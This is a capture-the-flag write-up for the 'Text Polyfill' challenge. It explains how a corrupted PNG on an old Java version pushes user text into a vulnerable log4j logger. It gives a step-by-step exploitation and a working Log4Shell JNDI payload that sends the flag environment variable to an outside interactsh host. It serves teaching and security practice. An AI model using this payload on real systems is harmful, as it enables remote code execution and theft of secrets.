# Text Polyfill

## Challenge Description
We feel your pain. You love to generate art with AI, but hate the fact it can't put simple text on your pictures. Well... Fear no more. Our simple website allows to add any text to your AI generated images without a hassle. Enjoy!

## Initial Analysis
The challenge provides a web application that allows users to upload an image and add text to it. The application is built using Java and runs on an Apache Tomcat server.

Upon analyzing the provided code and Dockerfile, we notice the following:
- The application uses an old Java version (1.8.0_71) 

```bash
root@f5a8b076a1d3:/> java -version

java version "1.8.0_71"

Java(TM) SE Runtime Environment (build 1.8.0_71-b15)

Java HotSpot(TM) 64-Bit Server VM (build 25.71-b15, mixed mode)
```

- The `ImageTextServer` servlet handles the image processing and text overlay functionality.
- The `javax.imageio.ImageIO` library is used to read and write images.
- The application uses a vulnerable version of the `log4j` library (2.14.1) for logging.

```xml
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.1</version>
    </dependency>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-api</artifactId>
        <version>2.14.1</version>
    </dependency>
</dependencies>
```

This log4j allows to execute Log4Shell attack, but the only pace the logger is used is in the exception that should never happen according to the documentation of `javax.imageio.ImageIO`.

Further investigation reveals that there is a known bug in the `javax.imageio.ImageIO` library for the specific Java version used in the challenge. The bug causes the library to throw undocumented exceptions other than `IOException` when processing corrupted PNG images.

https://bugs.openjdk.org/browse/JDK-8152979

## Vulnerability
The vulnerability in this challenge lies in the combination of two factors:

1. The use of an outdated Java version (1.8.0_71) with a known bug in the `javax.imageio.ImageIO` library.
2. The presence of a vulnerable version of the `log4j` library (2.14.1) in the application.

By exploiting the bug in the `javax.imageio.ImageIO` library, we can trigger an exception that is not properly handled by the application. This exception will be logged using the vulnerable `log4j` library, allowing us to inject malicious payloads and perform a remote code execution attack known as Log4Shell.

## Exploitation
To exploit this vulnerability and retrieve the flag, we can use the `interactsh` tool to simplify the process. Here's how we can do it:

1. Install the `interactsh` tool by following the instructions on the [project's GitHub repository](https://github.com/projectdiscovery/interactsh).

2. Start an `interactsh` server:

```
interactsh-client -v
```

3. Note the generated interaction URL provided by `interactsh`.

4. Create a corrupted PNG image by randomly changing some bytes in a valid PNG file.

5. Prepare a Log4Shell payload using the `interactsh` interaction URL:

```
${jndi:ldap://${env:flag}.<interactsh-url>}
```

Replace `<interactsh-url>` with the interaction URL obtained from `interactsh`.

6. Send a POST request to the `/process` endpoint of the application, including the corrupted PNG image and the Log4Shell payload as the text parameter.

7. The `javax.imageio.ImageIO` library will throw an undocumented exception while processing the corrupted image.

8. The exception will be caught by the generic `Exception` block in the code, and the text parameter (containing the Log4Shell payload) will be logged using the vulnerable `log4j` library.

9. The Log4Shell payload will be executed, triggering an interaction with the `interactsh` server.

10. The `interactsh` server will capture the interaction, which will include the value of the "flag" environment variable.


Flag: `1753c{generate_text_to_get_an_epic_rce}`

### Conclusion
The "Text Polyfill" challenge demonstrates the risks associated with using outdated software components and the importance of proper exception handling and input validation. The combination of a known bug in the `javax.imageio.ImageIO` library and the presence of a vulnerable `log4j` version allowed for a remote code execution attack using the Log4Shell vulnerability.

This challenge highlights the need for regular software updates, thorough testing, and secure coding practices to prevent such vulnerabilities. It also emphasizes the importance of properly handling exceptions and validating user input to mitigate the risk of exploitable scenarios.

By leveraging the `interactsh` tool, participants can simplify the exploitation process and capture the flag value through interactions triggered by the Log4Shell payload. This tool provides a convenient way to detect and capture out-of-band interactions during the exploitation of vulnerabilities like Log4Shell.